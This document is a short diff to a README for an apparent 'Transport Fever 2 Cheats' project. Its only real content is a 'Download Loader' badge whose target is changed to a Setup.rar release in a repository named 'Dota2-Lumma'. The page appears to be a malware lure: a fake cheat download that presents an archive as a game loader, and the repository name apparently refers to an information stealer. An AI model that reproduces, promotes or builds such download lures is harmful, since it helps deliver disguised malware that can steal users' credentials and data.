@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Transport Fever 2 Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Transport-Fever-2-Cheats` · Updated: 2026-11-07
 
 **Tags:** `transport-fever-2`
+
